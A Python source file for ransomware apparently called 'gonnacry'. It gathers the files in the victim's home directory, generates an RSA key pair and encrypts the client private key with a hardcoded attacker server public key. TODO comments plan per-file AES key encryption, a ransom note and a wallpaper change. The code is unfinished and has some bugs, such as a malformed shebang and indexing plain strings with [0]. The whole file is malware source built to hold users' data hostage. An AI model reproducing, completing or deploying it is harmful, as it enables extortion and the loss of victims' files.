#!/bin/bash/env python
# coding=UTF-8

import os
import asymmetric
import get_files
import symmetric
import enviroment
from Crypto.PublicKey import RSA
import gc
from Crypto.Hash import MD5

# const variables
server_public_key = ("""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxF5BOX3N5UN1CsHpnfuU
58lOw0+scQ39hOn6Q/QvM6aTOnYZki57O6/JtgV2CetE+G5IZrRwYPAipFdChGM9
RNZVegpnmGQCSRPlkfjN0TjfCFjaUX80PgRVm0ZHaeCeoNjit0yeW3YZ5nBjPjNr
36BLaswJo1zbzhctK2SYX+Miov04D3iC83Vc8bbJ8Wiip4jpKPDFhyO1I3QkykL0
4T1+tQXaGujLzc3QxJN3wo8rWkQ4CaLAu1pb9QkdYhFG0D3TrljkRNiH0QnF3Asc
XAQNI94ZPaqD6e2rWcSy2ZMiKVJgCWA40p9qe34H8+9ub3TgC52oSyapwbxzqs5v
DQIDAQAB
-----END PUBLIC KEY-----""")

ransomware_name = ("gonnacry")




def menu():

    # enviroment paths
    home = enviroment.get_home_path()
    desktop = enviroment.get_desktop_path()
    username = enviroment.get_username()
    ransomware_path = os.path.join(home, ransomware_name[0])

    # create ransomware directory 
    os.mkdir(ransomware_path, 0600)


    # get the files in the home directory
    # /home/$USER
    files = get_files.find_files(home)






    # create RSA object
    rsa_object = asymmetric.assymetric()
    rsa_object.generate_keys()
    
    server_public_key_object = RSA.importKey(server_public_key[0])

    Client_private_key = rsa_object.private_key_PEM
    Client_public_key = rsa_object.public_key_PEM

    # encrypt the client private key with servers public key
    encrypted_private_key = server_public_key_object.encrypt(Client_private_key, 'x')[0]
    with open(ransomware_path + "encrypted_private_key", 'wb') as f:
        f.write(encrypted_private_key)
    

    # rsa_object = None # ????
    # gc.clean()

    # TODO
    # encrypt all the AES keys with Client public key 
    # create file with description of what happened
    # change wallpaper
    # create file with all encrypted files path's




if __name__ == "__main__":
    menu()





